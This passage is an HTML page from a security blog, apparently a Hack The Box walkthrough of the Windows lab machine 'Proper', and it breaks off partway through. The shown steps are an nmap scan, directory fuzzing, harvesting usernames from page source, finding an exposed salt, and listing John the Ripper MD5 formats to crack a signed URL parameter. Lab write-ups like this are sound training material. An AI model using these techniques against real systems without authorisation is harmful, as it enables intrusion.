@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	13 Mar 2021IP:	10.10.10.231">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[proper]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/05/08/proper/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	13 Mar 2021IP:	10.10.10.231">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1948.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1949.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1950.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1951.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1952.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1953.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1954.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1955.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1956.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1957.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1958.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1959.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1960.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1961.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1962.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1963.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1964.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1965.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1966.jpg">
+<meta property="article:published_time" content="2021-05-08T08:55:39.000Z">
+<meta property="article:modified_time" content="2021-08-21T20:32:50.446Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1948.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/05/08/proper/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/05/08/proper/","path":"2021/05/08/proper/","title":"Hack-The-Box-walkthrough[proper]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[proper] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Directory-x2F-File-Enumeration"><span class="nav-number">3.</span> <span class="nav-text">Directory&#x2F;File Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Licenses"><span class="nav-number">4.</span> <span class="nav-text">Licenses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#usernames"><span class="nav-number">5.</span> <span class="nav-text">usernames</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Salt"><span class="nav-number">6.</span> <span class="nav-text">Salt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#John-the-Ripper"><span class="nav-number">7.</span> <span class="nav-text">John the Ripper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Database-Enumeration-with-sqlmap"><span class="nav-number">8.</span> <span class="nav-text">Database Enumeration with sqlmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Licensing-Portal"><span class="nav-number">9.</span> <span class="nav-text">Licensing Portal</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Remote-File-Inclusion"><span class="nav-number">10.</span> <span class="nav-text">Remote File Inclusion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Race-Condition"><span class="nav-number">11.</span> <span class="nav-text">Race Condition</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Foothold"><span class="nav-number">12.</span> <span class="nav-text">Foothold</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">13.</span> <span class="nav-text">Privilege Escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reversing-client-exe-and-server-exe"><span class="nav-number">14.</span> <span class="nav-text">Reversing client.exe and server.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-of-client-exe"><span class="nav-number">15.</span> <span class="nav-text">Analysis of client.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-of-server-exe"><span class="nav-number">16.</span> <span class="nav-text">Analysis of server.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Getting-root-txt"><span class="nav-number">17.</span> <span class="nav-text">Getting root.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-directory-junction"><span class="nav-number">18.</span> <span class="nav-text">Create directory junction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CLEAN"><span class="nav-number">19.</span> <span class="nav-text">CLEAN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Remove-directory-junction-and-create-a-real-folder"><span class="nav-number">20.</span> <span class="nav-text">Remove directory junction and create a real folder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RESTORE"><span class="nav-number">21.</span> <span class="nav-text">RESTORE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Afterthought"><span class="nav-number">22.</span> <span class="nav-text">Afterthought</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">23.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">24.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/05/08/proper/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[proper] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[proper]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-08 16:55:39" itemprop="dateCreated datePublished" datetime="2021-05-08T16:55:39+08:00">2021-05-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-08-22 04:32:50" itemprop="dateModified" datetime="2021-08-22T04:32:50+08:00">2021-08-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Windows<br>Difficulty:	Hard<br>Points:	40<br>Release:	13 Mar 2021<br>IP:	10.10.10.231</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1948.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- -Pn --min-rate=10000 10.10.10.231</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h3 id="Directory-x2F-File-Enumeration"><a href="#Directory-x2F-File-Enumeration" class="headerlink" title="Directory&#x2F;File Enumeration"></a>Directory&#x2F;File Enumeration</h3><p>Let’s see what wfuzz and SecLists has to offer.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1949.jpg"></li>
+</ul>
+<h3 id="Licenses"><a href="#Licenses" class="headerlink" title="Licenses"></a>Licenses</h3><p>I wonder what this is about?</p>
+<p>In any case, let’s keep this in view first while we check out other<br>information.</p>
+<h3 id="usernames"><a href="#usernames" class="headerlink" title="usernames"></a>usernames</h3><p>I thought I saw some very interesting HTML IDs when I was looking at the<br>HTML source code.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div role=<span class="string">&quot;tabpanel&quot;</span> class=<span class="string">&quot;tab-pane fade in active&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;dustin&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Doesn’t that look like a username? Wait, there’s more…</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div role=<span class="string">&quot;tabpanel&quot;</span> class=<span class="string">&quot;tab-pane fade&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;daksh&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;div role=<span class="string">&quot;tabpanel&quot;</span> class=<span class="string">&quot;tab-pane fade&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;anna&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;div role=<span class="string">&quot;tabpanel&quot;</span> class=<span class="string">&quot;tab-pane fade&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;wafer&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>And this…</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(document).ready(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    jQuery(<span class="string">&#x27;#headerwrap&#x27;</span>).backstretch([ <span class="string">&quot;assets/img/bg/bg1.jpg&quot;</span>, <span class="string">&quot;assets/img/bg/bg3.jpg&quot;</span> ], &#123;duration: 8000, fade: 500&#125;);</span><br><span class="line">    $( <span class="string">&quot;#product-content&quot;</span> ).load(<span class="string">&quot;/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;</span>,<span class="function"><span class="title">function</span></span>() &#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Salt"><a href="#Salt" class="headerlink" title="Salt"></a>Salt</h3><p>Interestingly, if either parameter (order or h) from the above relative URL is<br>missing, I get the following, what looks like an error message.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1950.jpg"></li>
+</ul>
+<p>From the message, a salt of some kind is exposed. I wonder where does the<br>salt fit in?</p>
+<h3 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h3><p>Could the MD5 hash a1b30d31d344a5a4e41e8496ccbdd26b be the MD5<br>digest of the salt combined in some way with the value in the order<br>parameter? To confirm I came up with the following wordlist, in<br>combination with John the Ripper.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>+desc</span><br><span class="line"><span class="built_in">id</span>%20desc</span><br><span class="line"><span class="built_in">id</span> desc</span><br></pre></td></tr></table></figure>
+
+<p>These are the dynamic formats in JtR involving MD5.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/proper]</span><br><span class="line">└─<span class="comment"># john --list=subformats | grep md5</span></span><br><span class="line">Format = dynamic_0   <span class="built_in">type</span> = dynamic_0: md5(<span class="variable">$p</span>) (raw-md5)</span><br><span class="line">Format = dynamic_1   <span class="built_in">type</span> = dynamic_1: md5(<span class="variable">$p</span>.<span class="variable">$s</span>) (joomla)</span><br><span class="line">Format = dynamic_2   <span class="built_in">type</span> = dynamic_2: md5(md5(<span class="variable">$p</span>)) (e107)</span><br><span class="line">Format = dynamic_3   <span class="built_in">type</span> = dynamic_3: md5(md5(md5(<span class="variable">$p</span>)))</span><br><span class="line">Format = dynamic_4   <span class="built_in">type</span> = dynamic_4: md5(<span class="variable">$s</span>.<span class="variable">$p</span>) (OSC)</span><br><span class="line">Format = dynamic_5   <span class="built_in">type</span> = dynamic_5: md5(<span class="variable">$s</span>.<span class="variable">$p</span>.<span class="variable">$s</span>)</span><br><span class="line">Format = dynamic_6   <span class="built_in">type</span> = dynamic_6: md5(md5(<span class="variable">$p</span>).<span class="variable">$s</span>)</span><br><span class="line">Format = dynamic_8   <span class="built_in">type</span> = dynamic_8: md5(md5(<span class="variable">$s</span>).<span class="variable">$p</span>)</span><br><span class="line">Format = dynamic_9   <span class="built_in">type</span> = dynamic_9: md5(<span class="variable">$s</span>.md5(<span class="variable">$p</span>))</span><br><span class="line">Format = dynamic_10  <span class="built_in">type</span> = dynamic_10: md5(<span class="variable">$s</span>.md5(<span class="variable">$s</span>.<span class="variable">$p</span>))</span><br><span class="line">Format = dynamic_11  <span class="built_in">type</span> = dynamic_11: md5(<span class="variable">$s</span>.md5(<span class="variable">$p</span>.<span class="variable">$s</span>))</span><br><span class="line">Format = dynamic_12  <span class="built_in">type</span> = dynamic_12: md5(md5(<span class="variable">$s</span>).md5(<span class="variable">$p</span>)) (IPB)</span><br><span class="line">Format = dynamic_13  <span class="built_in">type</span> = dynamic_13: md5(md5(<span class="variable">$p</span>).md5(<span class="variable">$s</span>))</span><br><span class="line">Format = dynamic_14  <span class="built_in">type</span> = dynamic_14: md5(<span class="variable">$s</span>.md5(<span class="variable">$p</span>).<span class="variable">$s</span>)</span><br><span class="line">Format = dynamic_15  <span class="built_in">type</span> = dynamic_15: md5(<span class="variable">$u</span>.md5(<span class="variable">$p</span>).<span class="variable">$s</span>)</span><br><span class="line">Format = dynamic_16  <span class="built_in">type</span> = dynamic_16: md5(md5(md5(<span class="variable">$p</span>).<span class="variable">$s</span>).<span class="variable">$s2</span>)</span><br><span class="line">Format = dynamic_18  <span class="built_in">type</span> = dynamic_18: md5(<span class="variable">$s</span>.Y.<span class="variable">$p</span>.0xF7.<span class="variable">$s</span>) (Post.Office MD5)</span><br><span class="line">Format = dynamic_19  <span class="built_in">type</span> = dynamic_19: md5(<span class="variable">$p</span>) (Cisco PIX)</span><br><span class="line">Format = dynamic_20  <span class="built_in">type</span> = dynamic_20: md5(<span class="variable">$p</span>.<span class="variable">$s</span>) (Cisco ASA)</span><br><span class="line">Format = dynamic_22  <span class="built_in">type</span> = dynamic_22: md5(sha1(<span class="variable">$p</span>))</span><br><span class="line">Format = dynamic_23  <span class="built_in">type</span> = dynamic_23: sha1(md5(<span class="variable">$p</span>))</span><br><span class="line">Format = dynamic_29  <span class="built_in">type</span> = dynamic_29: md5(utf16(<span class="variable">$p</span>))</span><br><span class="line">Format = dynamic_34  <span class="built_in">type</span> = dynamic_34: md5(md4(<span class="variable">$p</span>))</span><br><span class="line">Format = dynamic_39  <span class="built_in">type</span> = dynamic_39: md5(<span class="variable">$s</span>.pad16(<span class="variable">$p</span>)) (net-md5)</span><br><span class="line">UserFormat = dynamic_1001  <span class="built_in">type</span> = dynamic_1001: md5(md5(md5(md5(<span class="variable">$p</span>))))</span><br><span 